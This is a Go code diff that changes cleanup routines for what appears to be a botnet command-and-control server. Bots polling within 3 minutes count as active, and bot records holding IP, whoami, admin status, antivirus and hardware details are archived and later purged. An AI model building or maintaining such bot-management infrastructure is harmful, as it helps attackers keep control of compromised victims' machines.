@@ -22,21 +22,32 @@ import (
 
 func TaskCleaner(db *sql.DB, interval time.Duration) {
 	go func() {
-		time.Sleep(interval)
-		_, err := db1.Exec(db, `delete from tasks where status in ('done', 'failed', 'canceled') and completed_at < UTC_TIMESTAMP() - INTERVAL 3 DAY`)
-		if err != nil {
-			log.Println("Task cleanup error: " + err.Error())
+		ticker := time.NewTicker(interval)
+		for range ticker.C {
+			_, err := db1.Exec(db, `delete from tasks where status in ('done', 'failed', 'canceled') and completed_at < UTC_TIMESTAMP() - INTERVAL 3 DAY`)
+			if err != nil {
+				log.Println("Task cleanup error: " + err.Error())
+			}
 		}
 	}()
 }
 
+/*
+Bot status:
+ 1. active
+ 2. inactive
+ 3. archived
+ 4. purged
+*/
 func DeadBotCleaner(db *sql.DB) {
-	// Create a goroutine to check inactive bot(checked per day)
-	// If bot is online [0, 7) is active and [7, 30) days is inactive, [30, ∞) is purged
+	// Create a goroutine to check inactive bot(checked every 3 minutes)
+	// If bot sends poll within 3 minutes means ACTIVE or its INACTIVE
 	go func() {
-		sqlStr := "update clients set status='inactive' where (lastseen >= UTC_TIMESTAMP() - INTERVAL 30 DAY) and (lastseen < UTC_TIMESTAMP() - INTERVAL 7 DAY)"
-		for {
-			time.Sleep(time.Duration(24) * time.Hour)
+		sqlStr := "update clients set status='inactive' where lastseen < UTC_TIMESTAMP() - INTERVAL 3 MINUTE and status='active'"
+		ticker := time.NewTicker(2 * time.Minute)
+		defer ticker.Stop()
+		//sqlStr := "update clients set status='inactive' where (lastseen >= UTC_TIMESTAMP() - INTERVAL 30 DAY) and (lastseen < UTC_TIMESTAMP() - INTERVAL 7 DAY)"
+		for range ticker.C {
 			_, err := db1.Exec(db, sqlStr)
 			if err != nil {
 				log.Println("DeadBotCleaner inactive db1.Exec error: " + err.Error())
@@ -44,13 +55,17 @@ func DeadBotCleaner(db *sql.DB) {
 			log.Println("DeadBotCleaner inactive db1.Exec okay ")
 		}
 	}()
-	// Create a goroutine to check archived bot(Checked per week)
+	// Create a goroutine to check ACHIVED bot(Checked every 3 days)
 	go func() {
-		sqlStr := "insert into clients_archived (guid, token, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastseen) " +
-			"select guid, token, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastseen from clients where lastseen < UTC_TIMESTAMP() - INTERVAL 30 DAY"
-		sqlDeleteStr := "delete from clients where lastseen < UTC_TIMESTAMP() - INTERVAL 30 DAY"
-		for {
-			time.Sleep(time.Duration(24*7) * time.Hour)
+		//sqlStr := "insert into clients_archived (guid, token, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastseen) " +
+		//	"select guid, token, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastseen from clients where lastseen < UTC_TIMESTAMP() - INTERVAL 30 DAY"
+		//sqlDeleteStr := "delete from clients where lastseen < UTC_TIMESTAMP() - INTERVAL 30 DAY"
+		sqlStr := "insert ignore into clients_archived (guid, token, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastseen) " +
+			"select guid, token, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastseen from clients where status='inactive' and lastseen < UTC_TIMESTAMP() - INTERVAL 3 DAY"
+		sqlUpdateStr := "update clients set status='archived' where status='inactive' and lastseen < UTC_TIMESTAMP() - INTERVAL 3 DAY"
+		ticker := time.NewTicker(time.Duration(3*12) * time.Hour)
+		defer ticker.Stop()
+		for range ticker.C {
 			tx, err := common.Db.Begin()
 			if err != nil {
 				log.Println("DeadBotCleaner archived tx.Begin error: " + err.Error())
@@ -63,7 +78,7 @@ func DeadBotCleaner(db *sql.DB) {
 				continue
 			}
 			// Delete record from clients table
-			_, err = tx.Exec(sqlDeleteStr)
+			_, err = tx.Exec(sqlUpdateStr)
 			if err != nil {
 				tx.Rollback()
 				log.Println("DeadBotCleaner archived delete tx.Rollback error: " + err.Error())
@@ -75,13 +90,13 @@ func DeadBotCleaner(db *sql.DB) {
 			}
 			log.Println("DeadBotCleaner archived commit okay ")
 		}
-
 	}()
 	// Create a go routine to delete purged bot(Checked per month)
 	go func() {
 		sqlStr := `delete from clients_archived where purged_after <= UTC_TIMESTAMP()`
-		for {
-			time.Sleep(time.Duration(24*30) * time.Hour)
+		ticker := time.NewTicker(time.Duration(24*15) * time.Hour)
+		defer ticker.Stop()
+		for range ticker.C {
 			_, err := db1.Exec(db, sqlStr)
 			if err != nil {
 				log.Println("DeadBotCleaner delete error: " + err.Error())
